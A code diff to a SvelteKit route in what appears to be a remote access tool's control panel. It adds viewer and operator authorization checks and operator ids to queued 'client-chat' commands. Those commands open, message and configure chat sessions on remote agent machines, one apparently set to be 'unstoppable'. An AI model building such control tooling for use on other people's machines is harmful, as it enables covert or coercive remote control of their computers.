@@ -2,6 +2,7 @@ import { randomUUID } from 'crypto';
 import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import { clientChatManager, ClientChatError } from '$lib/server/rat/client-chat';
 import type {
 	ClientChatAliasConfiguration,
@@ -54,9 +55,9 @@ function ensureAgentId(paramsId: string | undefined): string {
 	return paramsId;
 }
 
-function queueChatCommand(agentId: string, payload: ClientChatCommandPayload) {
+function queueChatCommand(agentId: string, payload: ClientChatCommandPayload, operatorId: string) {
 	try {
-		registry.queueCommand(agentId, { name: 'client-chat', payload });
+		registry.queueCommand(agentId, { name: 'client-chat', payload }, { operatorId });
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			throw error(err.status, err.message);
@@ -91,15 +92,17 @@ function normalizeFeatures(
 	return normalized;
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const agentId = ensureAgentId(params.id);
+	requireViewer(locals.user);
 	const session = clientChatManager.getState(agentId);
 	const response: ClientChatStateResponse = { session };
 	return json(response);
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const agentId = ensureAgentId(params.id);
+	const user = requireOperator(locals.user);
 
 	let payload: ChatActionRequest;
 	try {
@@ -121,12 +124,16 @@ export const POST: RequestHandler = async ({ params, request }) => {
 				client: current?.clientAlias ?? 'Client'
 			});
 			const features = normalizeFeatures(payload.features, { forceUnstoppable: true });
-			queueChatCommand(agentId, {
-				action: 'start',
-				sessionId,
-				aliases,
-				features
-			});
+			queueChatCommand(
+				agentId,
+				{
+					action: 'start',
+					sessionId,
+					aliases,
+					features
+				},
+				user.id
+			);
 			try {
 				const session = clientChatManager.ensureSession(agentId, {
 					sessionId,
@@ -149,7 +156,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 				return json(response);
 			}
 			const sessionId = payload.sessionId?.trim() || current.sessionId;
-			queueChatCommand(agentId, { action: 'stop', sessionId });
+			queueChatCommand(agentId, { action: 'stop', sessionId }, user.id);
 			try {
 				const session = clientChatManager.stopSession(agentId, sessionId);
 				const response: ClientChatStateResponse = { session };
@@ -177,16 +184,20 @@ export const POST: RequestHandler = async ({ params, request }) => {
 				operator: current.operatorAlias,
 				client: current.clientAlias
 			});
-			queueChatCommand(agentId, {
-				action: 'send-message',
-				sessionId,
-				message: {
-					id: messageId,
-					body: messageBody,
-					timestamp
+			queueChatCommand(
+				agentId,
+				{
+					action: 'send-message',
+					sessionId,
+					message: {
+						id: messageId,
+						body: messageBody,
+						timestamp
+					},
+					aliases
 				},
-				aliases
-			});
+				user.id
+			);
 			try {
 				const result = clientChatManager.sendOperatorMessage(agentId, {
 					sessionId,
@@ -227,12 +238,16 @@ export const POST: RequestHandler = async ({ params, request }) => {
 			const features = normalizeFeatures(payload.features, {
 				forceUnstoppable: current?.active ?? false
 			});
-			queueChatCommand(agentId, {
-				action: 'configure',
-				sessionId,
-				aliases,
-				features
-			});
+			queueChatCommand(
+				agentId,
+				{
+					action: 'configure',
+					sessionId,
+					aliases,
+					features
+				},
+				user.id
+			);
 			try {
 				const session = clientChatManager.configureSession(agentId, {
 					sessionId,
